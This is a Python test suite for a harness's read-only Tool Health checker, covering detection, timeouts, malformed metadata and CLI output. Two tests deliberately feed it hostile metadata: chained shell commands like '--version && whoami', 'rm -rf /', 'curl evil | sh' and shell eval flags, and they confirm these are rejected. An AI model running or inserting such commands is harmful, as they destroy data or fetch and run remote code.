#!/usr/bin/env python3
"""Tests for read-only Tool Health checking. No real Tools are executed."""

from __future__ import annotations

import hashlib
import inspect
import io
import os
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from harness import cli as harness_cli  # noqa: E402
from harness.tools.detection import (  # noqa: E402
    DetectionResult,
    DetectionStatus,
    ToolDetector,
)
from harness.tools.health import (  # noqa: E402
    HEALTH_CHECK_TIMEOUT_SECONDS,
    HealthStatus,
    ToolHealthChecker,
    format_health_cli_report,
    validate_health_contract,
)
from harness.tools.resolution import (  # noqa: E402
    load_tool_registry,
    resolve_tool,
)

REGISTRY = ROOT / "tools" / "registry.yaml"
HARNESS_YAML = ROOT / ".harness" / "harness.yaml"


def _file_fingerprint(path: Path) -> tuple[str, int]:
    data = path.read_bytes()
    return hashlib.sha256(data).hexdigest(), path.stat().st_mtime_ns


def cli_tool(
    *,
    tool_id: str = "sample",
    kind: str = "cli",
    health: dict | None = ...,  # type: ignore[assignment]
    detection: dict | None = None,
) -> dict:
    tool: dict = {
        "id": tool_id,
        "name": "Sample",
        "kind": kind,
        "detection": detection
        or {
            "executable": "sample",
            "version_arguments": ["--version"],
        },
    }
    if health is ...:
        tool["health"] = {"kind": "cli", "arguments": ["--version"]}
    elif health is not None:
        tool["health"] = health
    return tool


def detected(
    *,
    tool_id: str = "sample",
    status: DetectionStatus = DetectionStatus.DETECTED,
    path: str | None = "/bin/sample",
    version: str | None = "sample 1.0.0",
    reason: str | None = None,
) -> DetectionResult:
    return DetectionResult(
        tool_id=tool_id,
        detected=True,
        status=status,
        executable="sample",
        path=path,
        version=version,
        compatible=True,
        platform="linux",
        architecture="x64",
        reason=reason,
    )


def not_detected(
    *,
    tool_id: str = "sample",
    status: DetectionStatus = DetectionStatus.NOT_FOUND,
    reason: str = "executable not found on PATH: sample",
) -> DetectionResult:
    return DetectionResult(
        tool_id=tool_id,
        detected=False,
        status=status,
        executable="sample",
        path=None,
        compatible=True,
        platform="linux",
        architecture="x64",
        reason=reason,
    )


class FakeRunner:
    """Records structured argv invocations; never uses a shell."""

    def __init__(
        self,
        *,
        returncode: int = 0,
        stdout: str = "ok\n",
        stderr: str = "",
        timeout: bool = False,
        error: Exception | None = None,
    ) -> None:
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr
        self.timeout = timeout
        self.error = error
        self.calls: list[dict] = []

    def __call__(self, args, *, timeout):
        self.calls.append({"args": list(args), "timeout": timeout, "shell": False})
        if self.timeout:
            raise subprocess.TimeoutExpired(cmd=list(args), timeout=timeout)
        if self.error is not None:
            raise self.error
        return subprocess.CompletedProcess(
            args=list(args),
            returncode=self.returncode,
            stdout=self.stdout,
            stderr=self.stderr,
        )


class ToolHealthTests(unittest.TestCase):
    def test_healthy_tool(self) -> None:
        runner = FakeRunner(returncode=0)
        checker = ToolHealthChecker(run=runner)
        result = checker.check(cli_tool(), detected())
        self.assertTrue(result.healthy)
        self.assertEqual(result.status, HealthStatus.HEALTHY)
        self.assertEqual(result.exit_code, 0)
        self.assertIsNotNone(result.duration_ms)
        self.assertEqual(runner.calls[0]["args"], ["/bin/sample", "--version"])

    def test_unhealthy_tool(self) -> None:
        runner = FakeRunner(returncode=1, stderr="boom\n")
        result = ToolHealthChecker(run=runner).check(cli_tool(), detected())
        self.assertFalse(result.healthy)
        self.assertEqual(result.status, HealthStatus.UNHEALTHY)
        self.assertEqual(result.exit_code, 1)
        self.assertIn("exited with code 1", result.reason or "")

    def test_tool_not_detected(self) -> None:
        runner = FakeRunner()
        result = ToolHealthChecker(run=runner).check(cli_tool(), not_detected())
        self.assertFalse(result.healthy)
        self.assertEqual(result.status, HealthStatus.UNAVAILABLE)
        self.assertEqual(runner.calls, [])
        self.assertEqual(result.detection_status, DetectionStatus.NOT_FOUND.value)

    def test_unsupported_health_check(self) -> None:
        runner = FakeRunner()
        result = ToolHealthChecker(run=runner).check(
            cli_tool(health=None),
            detected(),
        )
        self.assertFalse(result.healthy)
        self.assertEqual(result.status, HealthStatus.UNSUPPORTED)
        self.assertEqual(runner.calls, [])

    def test_kind_unsupported(self) -> None:
        runner = FakeRunner()
        result = ToolHealthChecker(run=runner).check(
            cli_tool(kind="mcp-server"),
            detected(),
        )
        self.assertEqual(result.status, HealthStatus.UNSUPPORTED)
        self.assertEqual(runner.calls, [])

    def test_timeout(self) -> None:
        runner = FakeRunner(timeout=True)
        result = ToolHealthChecker(run=runner, timeout_seconds=0.5).check(
            cli_tool(),
            detected(),
        )
        self.assertFalse(result.healthy)
        self.assertEqual(result.status, HealthStatus.TIMEOUT)
        self.assertIn("timed out", result.reason or "")
        self.assertEqual(runner.calls[0]["timeout"], 0.5)

    def test_process_failure(self) -> None:
        runner = FakeRunner(error=OSError("exec format error"))
        result = ToolHealthChecker(run=runner).check(cli_tool(), detected())
        self.assertFalse(result.healthy)
        self.assertEqual(result.status, HealthStatus.ERROR)
        self.assertIn("failed to execute health probe", result.reason or "")

    def test_malformed_metadata(self) -> None:
        runner = FakeRunner()
        payloads = [
            cli_tool(health={"kind": "cli"}),
            cli_tool(health={"arguments": ["--version"]}),
            cli_tool(health={"kind": "cli", "arguments": []}),
            cli_tool(health={"kind": "cli", "arguments": [""]}),
            {"id": "sample", "kind": "cli", "health": "not-a-mapping"},
        ]
        for payload in payloads:
            with self.subTest(payload=payload):
                result = ToolHealthChecker(run=runner).check(payload, detected())
                self.assertEqual(result.status, HealthStatus.ERROR)
                self.assertFalse(result.healthy)
        self.assertEqual(runner.calls, [])

    def test_malicious_metadata(self) -> None:
        runner = FakeRunner()
        payloads = [
            cli_tool(health={"kind": "cli", "arguments": ["--version && whoami"]}),
            cli_tool(health={"kind": "cli", "arguments": ["--version;rm"]}),
            cli_tool(health={"kind": "cli", "command": "rm -rf /"}),
            cli_tool(health={"kind": "cli", "shell": True, "arguments": ["--version"]}),
            cli_tool(health={"kind": "cli", "script": "curl evil | sh", "arguments": ["--version"]}),
            cli_tool(health={"kind": "cli", "executable": "bash", "arguments": ["--version"]}),
        ]
        for payload in payloads:
            with self.subTest(payload=payload):
                result = ToolHealthChecker(run=runner).check(payload, detected())
                self.assertEqual(result.status, HealthStatus.ERROR)
                self.assertFalse(result.healthy)
        self.assertEqual(runner.calls, [])

    def test_shell_injection_attempt(self) -> None:
        runner = FakeRunner()
        result = ToolHealthChecker(run=runner).check(
            cli_tool(health={"kind": "cli", "arguments": ["--version", "|", "cat"]}),
            detected(),
        )
        self.assertEqual(result.status, HealthStatus.ERROR)
        self.assertEqual(runner.calls, [])

    def test_shell_flag_attempt(self) -> None:
        runner = FakeRunner()
        for flag in ("-c", "-e", "-Command", "--eval", "--execute"):
            with self.subTest(flag=flag):
                result = ToolHealthChecker(run=runner).check(
                    cli_tool(health={"kind": "cli", "arguments": [flag]}),
                    detected(),
                )
                self.assertEqual(result.status, HealthStatus.ERROR)
        self.assertEqual(runner.calls, [])

    def test_no_filesystem_writes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            marker = root / "marker.txt"
            marker.write_text("unchanged\n", encoding="utf-8")
            before = _file_fingerprint(marker)
            entries_before = sorted(p.name for p in root.iterdir())
            ToolHealthChecker(run=FakeRunner()).check(cli_tool(), detected())
            self.assertEqual(sorted(p.name for p in root.iterdir()), entries_before)
            self.assertEqual(_file_fingerprint(marker), before)

    def test_no_registry_mutation(self) -> None:
        before_registry = _file_fingerprint(REGISTRY)
        before_harness = _file_fingerprint(HARNESS_YAML)
        registry = load_tool_registry(REGISTRY)
        tool = resolve_tool(registry, "rtk")
        ToolHealthChecker(run=FakeRunner()).check(
            tool,
            detected(tool_id="rtk", path="/mock/rtk", version="rtk fake"),
        )
        self.assertEqual(_file_fingerprint(REGISTRY), before_registry)
        self.assertEqual(_file_fingerprint(HARNESS_YAML), before_harness)

    def test_detection_health_composition(self) -> None:
        detect_runner = FakeRunner(stdout="sample 2.0.0\n")
        health_runner = FakeRunner(returncode=0)
        tool = cli_tool()
        detection = ToolDetector(
            which=lambda name: f"/usr/bin/{name}",
            run=detect_runner,
            platform_info=lambda: ("linux", "x64"),
        ).detect(tool)
        health = ToolHealthChecker(run=health_runner).check(tool, detection)
        self.assertEqual(detection.status, DetectionStatus.DETECTED)
        self.assertTrue(health.healthy)
        self.assertEqual(health_runner.calls[0]["args"], ["/usr/bin/sample", "--version"])
        self.assertEqual(health.detection_status, DetectionStatus.DETECTED.value)

    def test_rtk_mock_health(self) -> None:
        try:
            import yaml  # noqa: F401
        except ImportError as exc:  # pragma: no cover
            raise unittest.SkipTest(
                "Install scripts/requirements.txt before running tests"
            ) from exc

        registry = load_tool_registry(REGISTRY)
        tool = resolve_tool(registry, "rtk")
        self.assertIn("health", tool)

        detection = ToolDetector(
            which=lambda name: f"/mock/{name}",
            run=FakeRunner(stdout="rtk 0.9.0\n"),
            platform_info=lambda: ("linux", "x64"),
        ).detect(tool)
        health = ToolHealthChecker(run=FakeRunner(returncode=0)).check(tool, detection)

        self.assertEqual(detection.tool_id, "rtk")
        self.assertTrue(detection.detected)
        self.assertTrue(health.healthy)
        self.assertEqual(health.status, HealthStatus.HEALTHY)

    def test_incompatible_detection_is_unavailable(self) -> None:
        runner = FakeRunner()
        detection = DetectionResult(
            tool_id="sample",
            detected=True,
            status=DetectionStatus.INCOMPATIBLE,
            executable="sample",
            path="/bin/sample",
            compatible=False,
            platform="windows",
            architecture="x64",
            reason="host platform/architecture is not declared as supported",
        )
        result = ToolHealthChecker(run=runner).check(cli_tool(), detection)
        self.assertEqual(result.status, HealthStatus.UNAVAILABLE)
        self.assertEqual(runner.calls, [])

    def test_shell_true_never_used_in_default_runner(self) -> None:
        source = inspect.getsource(ToolHealthChecker._default_run)
        self.assertIn("shell=False", source)
        self.assertNotIn("shell=True", source)

        with mock.patch("harness.tools.health.subprocess.run") as run_mock:
            run_mock.return_value = subprocess.CompletedProcess(
                args=["/bin/sample", "--version"],
                returncode=0,
                stdout="ok\n",
                stderr="",
            )
            ToolHealthChecker().check(cli_tool(), detected())
            kwargs = run_mock.call_args.kwargs
            self.assertFalse(kwargs.get("shell", False))
            self.assertIsInstance(run_mock.call_args.args[0], list)

    def test_validate_health_contract_helper(self) -> None:
        self.assertIsNone(validate_health_contract({"kind": "cli", "arguments": ["--version"]}))
        self.assertIsNotNone(
            validate_health_contract({"kind": "cli", "arguments": ["--version && x"]})
        )

    def test_timeout_constant_is_checker_owned(self) -> None:
        self.assertGreater(HEALTH_CHECK_TIMEOUT_SECONDS, 0)
        self.assertLessEqual(HEALTH_CHECK_TIMEOUT_SECONDS, 10)

    def test_format_health_cli_report(self) -> None:
        report = format_health_cli_report(
            tool_name="RTK",
            detection=detected(tool_id="rtk", version="rtk 0.9.0"),
            health=ToolHealthChecker(run=FakeRunner()).check(
                cli_tool(tool_id="rtk"),
                detected(tool_id="rtk", version="rtk 0.9.0"),
            ),
        )
        self.assertIn("Tool Health", report)
        self.assertIn("RTK", report)
        self.assertIn("Detection: detected", report)
        self.assertIn("Health: healthy", report)
        self.assertIn("Version: rtk 0.9.0", report)

    def test_does_not_reuse_detection_runner_for_path_lookup(self) -> None:
        """Health must use DetectionResult.path and must not call which()."""
        which_calls: list[str] = []

        def fake_which(name: str) -> str | None:
            which_calls.append(name)
            return f"/bin/{name}"

        detection = ToolDetector(
            which=fake_which,
            run=FakeRunner(stdout="sample 1\n"),
            platform_info=lambda: ("linux", "x64"),
        ).detect(cli_tool())
        which_calls.clear()
        ToolHealthChecker(run=FakeRunner()).check(cli_tool(), detection)
        self.assertEqual(which_calls, [])


class ToolHealthCliTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        try:
            import yaml  # noqa: F401
        except ImportError as exc:  # pragma: no cover
            raise unittest.SkipTest(
                "Install scripts/requirements.txt before running tests"
            ) from exc

    def test_cli_success(self) -> None:
        detection = detected(tool_id="rtk", path="/mock/rtk", version="rtk 1.0.0")
        health_runner = FakeRunner(returncode=0)
        with (
            mock.patch("harness.commands.resolve_root_arg", return_value=ROOT),
            mock.patch(
                "harness.commands.ToolDetector.detect",
                return_value=detection,
            ),
            mock.patch(
                "harness.commands.ToolHealthChecker",
                return_value=ToolHealthChecker(run=health_runner),
            ),
            redirect_stdout(io.StringIO()) as out,
        ):
            code = harness_cli.main(["tools", "health", "rtk"])
        self.assertEqual(code, 0)
        text = out.getvalue()
        self.assertIn("Tool Health", text)
        self.assertIn("Health: healthy", text)
        self.assertIn("Detection: detected", text)

    def test_cli_failure(self) -> None:
        detection = detected(tool_id="rtk", path="/mock/rtk", version="rtk 1.0.0")
        with (
            mock.patch("harness.commands.resolve_root_arg", return_value=ROOT),
            mock.patch(
                "harness.commands.ToolDetector.detect",
                return_value=detection,
            ),
            mock.patch(
                "harness.commands.ToolHealthChecker",
                return_value=ToolHealthChecker(run=FakeRunner(returncode=7)),
            ),
            redirect_stdout(io.StringIO()) as out,
        ):
            code = harness_cli.main(["tools", "health", "rtk"])
        self.assertEqual(code, 1)
        self.assertIn("Health: unhealthy", out.getvalue())
        self.assertIn("exited with code 7", out.getvalue())

    def test_cli_missing_tool(self) -> None:
        with (
            mock.patch("harness.commands.resolve_root_arg", return_value=ROOT),
            redirect_stderr(io.StringIO()) as err,
            redirect_stdout(io.StringIO()),
        ):
            code = harness_cli.main(["tools", "health", "does-not-exist"])
        self.assertEqual(code, 1)
        self.assertIn("Unknown Tool id", err.getvalue())

    def test_cli_exit_codes_unavailable(self) -> None:
        detection = not_detected(tool_id="rtk")
        with (
            mock.patch("harness.commands.resolve_root_arg", return_value=ROOT),
            mock.patch(
                "harness.commands.ToolDetector.detect",
                return_value=detection,
            ),
            mock.patch(
                "harness.commands.ToolHealthChecker",
                return_value=ToolHealthChecker(run=FakeRunner()),
            ),
            redirect_stdout(io.StringIO()) as out,
        ):
            code = harness_cli.main(["tools", "health", "rtk"])
        self.assertEqual(code, 1)
        self.assertIn("Health: unavailable", out.getvalue())

    def test_cli_help_lists_tools(self) -> None:
        env = os.environ.copy()
        existing = env.get("PYTHONPATH", "")
        env["PYTHONPATH"] = (
            str(ROOT) if not existing else os.pathsep.join([str(ROOT), existing])
        )
        result = subprocess.run(
            [sys.executable, "-m", "harness", "--help"],
            cwd=str(ROOT),
            capture_output=True,
            text=True,
            check=False,
            env=env,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("tools", result.stdout.lower())


if __name__ == "__main__":
    unittest.main()
